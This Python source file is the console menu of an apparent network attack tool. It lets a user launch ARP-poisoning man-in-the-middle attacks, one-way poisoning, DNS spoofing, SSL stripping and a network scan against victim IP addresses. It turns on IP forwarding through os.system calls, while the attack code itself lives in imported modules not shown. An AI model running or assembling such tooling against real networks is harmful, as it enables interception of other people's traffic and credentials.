from arpPoison import *
from networkScan import *
from dnsPoison import *
from sslStripping import *
import os
from prompt_toolkit.shortcuts import button_dialog, input_dialog
from prompt_toolkit.formatted_text import to_formatted_text,HTML
import six
from collections import defaultdict

fixed_text = lambda x : to_formatted_text(HTML(six.text_type(x)))
stt = lambda x,y : (six.text_type(x), y)

"""
print("Welcome to the tool, this tool is a console style tool.")
print("For the list of commands use the command 'help'")
print("For more info on a command use the command 'help [command]'")
print("to close or reset the tool, use the input 'ctrl+c'")
print(">>>", end = " ")
"""

runner = True

while runner:
    
    user_in = button_dialog(title = fixed_text("Tool"),
                        text = fixed_text("Please select the desired function"),
                        buttons=[
                            stt("MiM", "mimattack"),
                            stt("One Way", "onewaypoisoning"),
                            stt("Scanner", "scan"),
                            stt("DNS Att", "dns"),
                            stt("SSL strip", "ssl"),
                            stt("exit", "exit")
                        ])
        
    if(user_in == "mimattack"):
        
        pap = button_dialog(title = fixed_text("Tool"),
                            text = fixed_text("Use the defult interface?"),
                            buttons=[
                            stt("Yes", True),
                            stt("No", False),
                            stt("Cancel", None)
                            ])
        
        os.system("sysctl net.ipv4.ipforward=1")
    
        if (pap != None):
            
            os.system("sysctl net.ipv4.ipforward=1")
            
            ipVictim = input_dialog(title = fixed_text("Tool"),
                                    text = fixed_text("Ip of the first Victim?"))
        
            ipVictim2 = input_dialog(title = fixed_text("Tool"),
                                    text = fixed_text("Ip of the second Victim?"))
            
            if(ipVictim != None) and (ipVictim2 != None):
            
                if pap == False:
                    interface = input_dialog(title = fixed_text("Tool"),
                                            text = fixed_text("Interface?"))
                    
                    if(interface != None):
                        mimAttack(str(interface), ipVictim, ipVictim2)
                    
                mimAttack(None,ipVictim,ipVictim2)
        
    elif(user_in == "onewaypoisoning"):
        
        pap = button_dialog(title = fixed_text("Tool"),
                            text = fixed_text("Use the default interface?"),
                            buttons=[
                            stt("Yes", True),
                            stt("No", False),
                            stt("Cancel", None)
                            ])
        
        if (pap != None):
            
            os.system("sysctl net.ipv4.ipforward=1")
            
            ipVictim = input_dialog(title = fixed_text("Tool"),
                                    text = fixed_text("Ip of the Victim?"))
        
            ipToSpoof = input_dialog(title = fixed_text("Tool"),
                                    text = fixed_text("Ip to spoof?"))
            
            if(ipVictim != None) and (ipToSpoof != None):
            
                if pap == False:
                    interface = input_dialog(title = fixed_text("Tool"),
                                             text = fixed_text("Interface?"))
                    
                    if(interface != None):
                        oneWayPoisoning(str(interface), ipVictim, ipToSpoof)
                    
                oneWayPoisoning(None,ipVictim,ipToSpoof)
    
    elif(user_in == "scan"):
        
        scan_mode = button_dialog(title = fixed_text("Tool"),
                            text = fixed_text("Use automatic scan?"),
                            buttons=[
                            stt("Yes", True),
                            stt("No", False),
                            stt("Cancel", None)
                            ])
        
        if(scan_mode == True):
            auto_scan()
        elif(scan_mode == False):
            
            gateway = input_dialog(title = fixed_text("Tool"),
                                   text = fixed_text("Gateway ip of the interface?"))
            
            subnetmask = input_dialog(title = fixed_text("Tool"),
                                      text = fixed_text("Subnet mask of the interface?"))
            
            manual_scan(gateway, subnetmask)
    
    elif(user_in == "dns"):
        
        #os.system("sysctl net.ipv4.ipforward=0")
        
        interface = input_dialog(title = fixed_text("Tool"),
                                 text = fixed_text("Interface?"))

        attacker_mac = mac_self(interface)        
#        attacker_mac = input_dialog(title = fixed_text("Tool"),
#                                    text = fixed_text("Your mac address?"))
        
        victim_ip = input_dialog(title = fixed_text("Tool"),
                                 text = fixed_text("Victim ip address?"))
        
        victim_mac = getmacbyip(victim_ip)
        
#        victim_mac = input_dialog(title = fixed_text("Tool"),
#                                  text = fixed_text("Victim mac address?"))
        
        gateway = input_dialog(title = fixed_text("Tool"),
                                 text = fixed_text("Gateway ip address?"))
        
        inputs = {"attacker MAC": attacker_mac, "victim MAC": victim_mac, "victim IP": victim_ip, "gateway IP": gateway}
        
        urls = defaultdict(lambda:[])
        
        #ask = True
        
        #while ask:
            
            #url = input_dialog(title = fixed_text("Tool"),
                               #text = fixed_text("URL to spoof?\nWrite \"done\" after last entry"))
            
            #ip = input_dialog(title = fixed_text("Tool"),
                              #text = fixed_text("Ip of the URL?\nWrite \"done\" after last entry"))
            
            #if(url != None) and (ip != None) and (url != "done") and (ip != "done"):
                #urls[url].append(ip)
            #else:
                #ask = False
        
        if(interface != None) and (attacker_mac != None) and (victim_ip != None) and (victim_mac != None) and (gateway != None):
            dnsPoisoning(str(interface), inputs, urls)
        
        
    
    elif(user_in == "ssl"):
        
        #os.system("sysctl net.ipv4.ipforward=0")
       
        startStripping()
    
    elif(user_in == "exit"):
        stopStripping()
        runner = False
